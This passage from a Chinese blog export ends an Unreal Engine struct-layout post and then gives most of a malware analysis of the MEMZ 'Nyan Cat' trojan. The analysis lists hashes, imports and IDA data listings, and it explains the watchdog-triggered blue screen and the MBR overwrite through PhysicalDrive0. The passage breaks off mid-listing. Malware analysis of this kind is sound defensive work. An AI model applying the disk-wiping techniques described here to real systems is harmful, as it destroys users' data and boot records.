*/</span></span><br><span class=\"line\">  uint16 RPCResponseId;</span><br><span class=\"line\">  <span class=\"comment\">/** pointer to first local struct property in this UFunction that contains defaults */</span></span><br><span class=\"line\">  UProperty* FirstPropertyToInit;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** The event graph this function calls in to (persistent) */</span></span><br><span class=\"line\">  UFunction* EventGraphFunction;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** The state offset inside of the event graph (persistent) */</span></span><br><span class=\"line\">  int32 EventGraphCallOffset;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** 所指向的函数地址 */</span></span><br><span class=\"line\">  FNativeFuncPtr Func;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UProperty</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UProperty</span> : <span class=\"keyword\">public</span> UField</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/** 成员上限 **/</span></span><br><span class=\"line\">    int32            ArrayDim;   </span><br><span class=\"line\">    <span class=\"comment\">/** 成员大小  **/</span></span><br><span class=\"line\">    int32            ElementSize;</span><br><span class=\"line\">    <span class=\"comment\">/** 成员标志  **/</span></span><br><span class=\"line\">    EPropertyFlags    PropertyFlags;</span><br><span class=\"line\">    uint16            RepIndex;</span><br><span class=\"line\">    <span class=\"comment\">/** 成员偏移  **/</span></span><br><span class=\"line\">    int32        Offset_Internal;</span><br><span class=\"line\">    FName        RepNotifyFunc;</span><br><span class=\"line\">    <span class=\"comment\">/** 下一个成员 **/</span></span><br><span class=\"line\">    UProperty*    PropertyLinkNext;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of object reference properties from most-derived to base **/</span></span><br><span class=\"line\">    UProperty*  NextRef;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring destruction. Note this does not include things that will be destroyed byt he native destructor **/</span></span><br><span class=\"line\">    UProperty*    DestructorLinkNext;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring post constructor initialization.**/</span></span><br><span class=\"line\">    UProperty*    PostConstructLinkNext;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二、手动解析\"><a href=\"#二、手动解析\" class=\"headerlink\" title=\"二、手动解析\"></a>二、手动解析</h1><ul>\n<li><strong>UObject</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<ul>\n<li><strong>UEnum</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<ul>\n<li><strong>UStruct</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<ul>\n<li><strong>UProperty</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<ul>\n<li><strong>UFunction</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<h1 id=\"实战：解析GameInstance类\"><a href=\"#实战：解析GameInstance类\" class=\"headerlink\" title=\"实战：解析GameInstance类\"></a>实战：解析GameInstance类</h1><ul>\n<li><strong>LocalPlayers</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<ul>\n<li><strong>OnlineSession</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<ul>\n<li><strong>ReferencedObjects</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n","categories":["UnrealEngine"]},{"title":"彩虹猫病毒分析","url":"/2024/04/21/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/","content":"<h1 id=\"彩虹猫病毒分析\"><a href=\"#彩虹猫病毒分析\" class=\"headerlink\" title=\"彩虹猫病毒分析\"></a>彩虹猫病毒分析</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-10-26 20:30</li>\n</ul>\n<p>这里没有放虚拟机运行，直接放微云沙盒跑，样本运行效果如下</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>提示是否要继续运行，之后电脑会出现各种弹窗，然后会重启，重启后直接出现彩虹猫并且播放音频</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<h1 id=\"样本分析\"><a href=\"#样本分析\" class=\"headerlink\" title=\"样本分析\"></a>样本分析</h1><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>彩虹猫</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>19dbec50735b5f2a72d4199c4e184960</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>6fed7732f7cb6f59743795b2ab154a3676f4c822</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>a3d5715a81f2fbeb5f76c88c9c21eeee87142909716472f911ff6950c790c24d</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>14.50 KB (14848 bytes)</td>\n</tr>\n</tbody></table>\n<p>Detect It Easy(DIE)查看PE信息如下</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>是一个32位程序，且无壳。直接查看导入表。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">SHELL32.dll</span><br><span class=\"line\">ShellExecuteW</span><br><span class=\"line\">ShellExecuteExW</span><br><span class=\"line\">CommandLineToArgvW</span><br><span class=\"line\">ShellExecuteA</span><br><span class=\"line\">KERNEL32.dll</span><br><span class=\"line\">CreateToolhelp32Snapshot</span><br><span class=\"line\">GetModuleFileNameW</span><br><span class=\"line\">GlobalFree</span><br><span class=\"line\">ExitProcess</span><br><span class=\"line\">LoadLibraryA</span><br><span class=\"line\">lstrlenW</span><br><span class=\"line\">Process32NextW</span><br><span class=\"line\">GetCurrentProcess</span><br><span class=\"line\">LocalAlloc</span><br><span class=\"line\">OpenProcess</span><br><span class=\"line\">GetCommandLineW</span><br><span class=\"line\">GetProcAddress</span><br><span class=\"line\">Process32FirstW</span><br><span class=\"line\">CreateThread</span><br><span class=\"line\">lstrcmpA</span><br><span class=\"line\">WriteFile</span><br><span class=\"line\">CloseHandle</span><br><span class=\"line\">lstrcmpW</span><br><span class=\"line\">SetPriorityClass</span><br><span class=\"line\">LocalFree</span><br><span class=\"line\">GlobalAlloc</span><br><span class=\"line\">Sleep</span><br><span class=\"line\">CreateFileA</span><br><span class=\"line\">GetCurrentThreadId</span><br><span class=\"line\">USER32.dll</span><br><span class=\"line\">DefWindowProcW</span><br><span class=\"line\">SendInput</span><br><span class=\"line\">GetMessageW</span><br><span class=\"line\">GetSystemMetrics</span><br><span class=\"line\">MessageBoxW</span><br><span class=\"line\">GetWindowRect</span><br><span class=\"line\">UnhookWindowsHookEx</span><br><span class=\"line\">DrawIcon</span><br><span class=\"line\">EnumChildWindows</span><br><span class=\"line\">MessageBoxA</span><br><span class=\"line\">GetWindowDC</span><br><span class=\"line\">TranslateMessage</span><br><span class=\"line\">DispatchMessageW</span><br><span class=\"line\">RegisterClassExA</span><br><span class=\"line\">GetCursorPos</span><br><span class=\"line\">ReleaseDC</span><br><span class=\"line\">SetCursorPos</span><br><span class=\"line\">CallNextHookEx</span><br><span class=\"line\">CreateWindowExA</span><br><span class=\"line\">GetDesktopWindow</span><br><span class=\"line\">SetWindowsHookExW</span><br><span class=\"line\">LoadIconW</span><br><span class=\"line\">SendMessageTimeoutW</span><br><span class=\"line\">ExitWindowsEx</span><br><span class=\"line\">ADVAPI32.dll</span><br><span class=\"line\">CryptAcquireContextW</span><br><span class=\"line\">AdjustTokenPrivileges</span><br><span class=\"line\">LookupPrivilegeValueW</span><br><span class=\"line\">CryptGenRandom</span><br><span class=\"line\">OpenProcessToken</span><br><span class=\"line\">PSAPI.DLL</span><br><span class=\"line\">GetProcessImageFileNameA</span><br><span class=\"line\">WINMM.dll</span><br><span class=\"line\">PlaySoundA</span><br><span class=\"line\">GDI32.dll</span><br><span class=\"line\">StretchBlt</span><br><span class=\"line\">BitBlt</span><br></pre></td></tr></table></figure>\n\n<p>根据导入表的显示，该样本可能存在的操作如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">提权（AdjustTokenPrivileges、LookupPrivilegeValueW、OpenProcessToken、SetPriorityClass）</span><br><span class=\"line\">遍历进程（CreateToolhelp32Snapshot、Process32FirstW、Process32NextW）</span><br><span class=\"line\">遍历窗口（EnumChildWindows）</span><br><span class=\"line\">全局钩子（SetWindowsHookExW、CallNextHookEx、UnhookWindowsHookEx）</span><br><span class=\"line\">鼠标操作（SetCursorPos、GetCursorPos）</span><br><span class=\"line\">键盘操作（SendInput）</span><br><span class=\"line\">创建窗口（CreateWindowExA）</span><br><span class=\"line\">运行程序（ShellExecuteW）</span><br><span class=\"line\">绘图（BitBlt、StretchBlt）</span><br><span class=\"line\">播放音频（PlaySoundA）</span><br></pre></td></tr></table></figure>\n\n<p>接下来是拖进IDA进一步的分析。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>大概浏览了伪代码之后，得知该样本存在两种运行方式，附带参数分别为 <strong>&#x2F;watchdog</strong> 和 <strong>&#x2F;main</strong>。首先是分析**&#x2F;watchdog**参数。</p>\n<h1 id=\"一、-x2F-watchdog\"><a href=\"#一、-x2F-watchdog\" class=\"headerlink\" title=\"一、&#x2F;watchdog\"></a>一、&#x2F;watchdog</h1><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>以&#x2F;watchdog方式运行时，会先创建一个线程，然后创建一个窗口。先分析ThreadProc。</p>\n<h3 id=\"1-ThreadProc分析\"><a href=\"#1-ThreadProc分析\" class=\"headerlink\" title=\"[1]ThreadProc分析\"></a>[1]ThreadProc分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>该线程首先是获取自身路径后，进行进程遍历，统计自身进程数，如果自己的数量少了1，则会执行下面的<strong>Blue_MsgBox_fixWndSize</strong>函数。</p>\n<h3 id=\"2-Blue-MsgBox-fixWndSize分析\"><a href=\"#2-Blue-MsgBox-fixWndSize分析\" class=\"headerlink\" title=\"[2]Blue_MsgBox_fixWndSize分析\"></a>[2]Blue_MsgBox_fixWndSize分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>函数首先是启动了20是个线程，然后触发一个蓝屏，如果蓝屏触发失败则会重启。双击StartAddress，发现光标直接跳到return的位置</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>于是切换到反汇编查看汇编代码。</p>\n<h3 id=\"3-StartAddress分析\"><a href=\"#3-StartAddress分析\" class=\"headerlink\" title=\"[3]StartAddress分析\"></a>[3]StartAddress分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>首先调用<strong>SetWindowHookExW</strong>设置了一个<strong>WH_CBT</strong>的钩子，钩子函数为<strong>fn</strong>，这样当窗口有变化时会自动调用<strong>fn</strong>，紧接从lpText从随机取出一条文本用来弹窗。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:<span class=\"number\">004050</span>C8     lpText          dd offset aYouKilledMyTro</span><br><span class=\"line\">.data:<span class=\"number\">004050</span>C8                                             ; DATA XREF: Blue_MsgBox_fixWndSize+<span class=\"number\">10</span>D↑r</span><br><span class=\"line\">.data:<span class=\"number\">004050</span>C8                                             ; <span class=\"string\">&quot;YOU KILLED MY TROJAN!\\r\\nNow you are go&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">004050</span>CC                     dd offset aRestInPissFore ; <span class=\"string\">&quot;REST IN PISS, FOREVER MISS.&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>D0                     dd offset aIWarnedYou   ; <span class=\"string\">&quot;I WARNED YOU...&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>D4                     dd offset aHahaN00bL2pG3t ; <span class=\"string\">&quot;HAHA N00B L2P G3T R3KT&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>D8                     dd offset aYouFailedAtYou ; <span class=\"string\">&quot;You failed at your 1337 h4x0r skillz.&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>DC                     dd offset aYouTriedSoHard ; <span class=\"string\">&quot;YOU TRIED SO HARD AND GOT SO FAR, BUT I&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">004050E0</span>                     dd offset aHackerEnjoyBan ; <span class=\"string\">&quot;HACKER!\\r\\nENJOY BAN!&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050E4</span>                     dd offset aGetBetterHaxNe ; <span class=\"string\">&quot;GET BETTER HAX NEXT TIME xD&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050E8</span>                     dd offset aHaveFunTryingT ; <span class=\"string\">&quot;HAVE FUN TRYING TO RESTORE YOUR DATA :D&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>EC                     dd offset a32           ; <span class=\"string\">&quot;|\\\\/|3|\\\\/|2&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050F</span>0                     dd offset aBsodIncoming ; <span class=\"string\">&quot;BSOD INCOMING&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050F</span>4                     dd offset aVirusPrankGone ; <span class=\"string\">&quot;VIRUS PRANK (GONE WRONG)&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050F</span>8                     dd offset aEnjoyTheNyanCa ; <span class=\"string\">&quot;ENJOY THE NYAN CAT&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050F</span>C                     dd offset aGetDankAntivir ; <span class=\"string\">&quot;Get dank antivirus m9!&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405100</span>                     dd offset aYouAreAnIdiotH ; <span class=\"string\">&quot;You are an idiot!\\r\\nHA HA HA HA HA HA &quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405104</span>                     dd offset aMakemalwaregre ; <span class=\"string\">&quot;#MakeMalwareGreatAgain&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405108</span>                     dd offset aSomebodyOnceTo ; <span class=\"string\">&quot;SOMEBODY ONCE TOLD ME THE MEMZ ARE GONN&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040510</span>C                     dd offset aWhyDidYouEvenT ; <span class=\"string\">&quot;Why did you even tried to kill MEMZ?\\r&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405110</span>                     dd offset aSecurebootSuck ; <span class=\"string\">&quot;SecureBoot sucks.&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405114</span>                     dd offset aGr8M8IR888   ; <span class=\"string\">&quot;gr8 m8 i r8 8/8&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405118</span>                     dd offset aHaveYouTriedTu ; <span class=\"string\">&quot;Have you tried turning it off and on ag&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040511</span>C                     dd offset aInsertJoelQuot ; <span class=\"string\">&quot;&lt;Insert Joel quote here&gt;&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405120</span>                     dd offset aGreetingsToAll ; <span class=\"string\">&quot;Greetings to all GAiA members!&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405124</span>                     dd offset aWellHelloThere ; <span class=\"string\">&quot;Well, hello there. I don&#x27;t believe we&#x27;v&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405128</span>                     dd offset aThisIsEverythi ; <span class=\"string\">&quot;&#x27;This is everything I want in my comput&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040512</span>C                     dd offset aUhClubPenguinT ; <span class=\"string\">&quot;&#x27;Uh, Club Penguin. Time to get banned!&#x27;&quot;</span>...</span><br></pre></td></tr></table></figure>\n\n<p>最后把钩子卸载，接下来看看挂钩的函数干了什么。</p>\n<h3 id=\"4-fn分析\"><a href=\"#4-fn分析\" class=\"headerlink\" title=\"[4]fn分析\"></a>[4]fn分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>可以看到如果消息类型为创建新窗口时，就会修改窗口宽高为屏幕范围内的一个随机值。</p>\n<p>最后我们还差一个函数，那就是创建窗口时，窗口的CallBack</p>\n<h3 id=\"5-CallBack分析\"><a href=\"#5-CallBack分析\" class=\"headerlink\" title=\"[5]CallBack分析\"></a>[5]CallBack分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>内容也很简单，判断当前msg是否为关闭窗口，如果是关闭窗口则直接触发蓝屏操作。</p>\n<p>回到主程序继续分析。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>样本打开了一个串口<em><strong>.\\PhysicalDrive0</strong></em>，其中<strong>PhysicalDrive0</strong>表示本机的物理驱动器0(一般是主硬盘)。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>然后开始向MBR写入内容。这里贴一下关于MBR的介绍</p>\n<blockquote>\n<p>主引导记录（MBR），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区。在深入讨论主引导扇区内部结构的时候，有时也将其开头的446字节内容特指为“主引导记录”（MBR），其后是4个16字节的“磁盘分区表”（DPT），以及2字节的结束标志（55AA）。因此，在使用“主引导记录”（MBR）这个术语的时候，需要根据具体情况判断其到底是指整个主引导扇区，还是主引导扇区的前446字节。 -来自：百度百科</p>\n</blockquote>\n<p>其中关键点为主引导记录，也就是开头的446字节，其后的就是DPT还有结束标志0x55AA。</p>\n<p>这段代码有两个While，第一个是直接重写了MBR，这样系统在启动的时候就无法将控制权转交给操作系统，而是执行样本写入的数据。然后是第二个While，只从<strong>0x1FE</strong>开始写入彩虹猫动画程序，<strong>446 + 4*16 &#x3D; 0x1BE+ 0x40 &#x3D; 0x1FE</strong>,双击<strong>loc_402248，也可以看到数据头为</strong>0x55AA**。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>之后样本会创建一个note.txt，然后写入内容后并打开。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>最后启动了5个线程。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<h3 id=\"6-openWeb-Exe分析\"><a href=\"#6-openWeb-Exe分析\" class=\"headerlink\" title=\"[6]openWeb_Exe分析\"></a>[6]openWeb_Exe分析</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>双击<strong>openWeb_Exe</strong>之后发现函数将参数作为函数运行，而线程的参数为<strong>v9,v9</strong>来自<strong>off_405130</strong>，跳转过去后发现存在一个函数。</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>再跳转到这个函数</p>\n<p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>这里会调用<strong>ShellExecuteA</strong>随机执行一些东西。lpFile内容如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:<span class=\"number\">00405000</span>     lpFile          dd offset aHttpGoogleCoCk</span><br><span class=\"line\">.data:<span class=\"number\">00405000</span>                                             ; DATA XREF: sub_4014FC+<span class=\"number\">18</span>↑r</span><br><span class=\"line\">.data:<span class=\"number\">00405000</span>                                             ; <span class=\"string\">&quot;http://google.co.ck/search?q=best+way+t&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405004</span>                     dd offset aHttpGoogleCoCk_0 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+2+remo&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405008</span>                     dd offset aHttpGoogleCoCk_1 ; <span class=\"string\">&quot;http://google.co.ck/search?q=mcafee+vs+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040500</span>C                     dd offset aHttpGoogleCoCk_2 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+to+sen&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405010</span>                     dd offset aHttpGoogleCoCk_3 ; <span class=\"string\">&quot;http://google.co.ck/search?q=minecraft+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405014</span>                     dd offset aHttpGoogleCoCk_4 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+to+get&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405018</span>                     dd offset aHttpGoogleCoCk_5 ; <span class=\"string\">&quot;http://google.co.ck/search?q=bonzi+budd&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040501</span>C                     dd offset aHttpGoogleCoCk_6 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+2+buy+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405020</span>                     dd offset aHttpGoogleCoCk_7 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+to+cod&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405024</span>                     dd offset aHttpGoogleCoCk_8 ; <span class=\"string\">&quot;http://google.co.ck/search?q=what+happe&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405028</span>                     dd offset aHttpGoogleCoCk_9 ; <span class=\"string\">&quot;http://google.co.ck/search?q=g3t+r3kt&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">0040502</span>C                     dd offset aHttpGoogleCoCk_10 ; <span class=\"string\">&quot;http://google.co.ck/search?q=batch+viru&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405030</span>                     dd offset aHttpGoogleCoCk_11 ; <span class=\"string\">&quot;http://google.co.ck/search?q=virus.exe&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405034</span>                     dd offset aHttpGoogleCoCk_12 ; <span class=\"string\">&quot;http://google.co.ck/search?q=internet+e&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405038</span>                     dd offset aHttpGoogleCoCk_13 ; <span class=\"string\">&quot;http://google.co.ck/search?q=facebook+h&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040503</span>C                     dd offset aHttpGoogleCoCk_14 ; <span class=\"string\">&quot;http://google.co.ck/search?q=virus+buil&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405040</span>                     dd offset aHttpGoogleCoCk_15 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+to+cre&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405044</span>                     dd offset aHttpGoogleCoCk_16 ; <span class=\"string\">&quot;http://google.co.ck/search?q=how+to+rem&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405048</span>                     dd offset aHttpGoogleCoCk_17 ; <span class=\"string\">&quot;http://google.co.ck/search?q=my+compute&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040504</span>C                     dd offset aHttpGoogleCoCk_18 ; <span class=\"string\">&quot;http://google.co.ck/search?q=dank+memz&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405050</span>                     dd offset aHttpGoogleCoCk_19 ; <span 